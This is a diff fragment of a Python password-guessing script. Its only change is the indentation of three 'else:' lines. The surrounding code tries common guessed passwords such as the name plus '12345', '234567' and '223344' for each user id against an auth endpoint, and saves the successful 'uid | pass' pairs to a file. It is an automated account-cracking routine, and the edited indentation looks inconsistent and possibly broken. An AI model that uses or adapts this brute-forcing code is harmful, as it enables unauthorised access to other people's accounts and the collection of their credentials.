@@ -361,7 +361,7 @@ def b_menu_select():
 		                cp.write(uid+" | "+pass1+"\n")
 		                cp.close()
 		                cps.append(uid + pass1)
-		            else:
+		           else:
 		                pass2=name+"12345"
 		                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                                 q = json.loads(data)
@@ -378,7 +378,7 @@ def b_menu_select():
 		                        cp.write(uid+" | "+pass2+"\n")
 		                        cp.close()
 		                        cps.append(uid + pass2)
-		                    else:
+		                   else:
 		                        pass3="234567"
 		                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                                         q = json.loads(data)
@@ -395,7 +395,7 @@ def b_menu_select():
 		                                cp.write(uid+" | "+pass3+"\n")
 		                                cp.close()
 		                                cps.append(uid + pass3)
-		                            else:
+		                           else:
 		                            pass4="223344"
 		                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                                             q = json.loads(data)
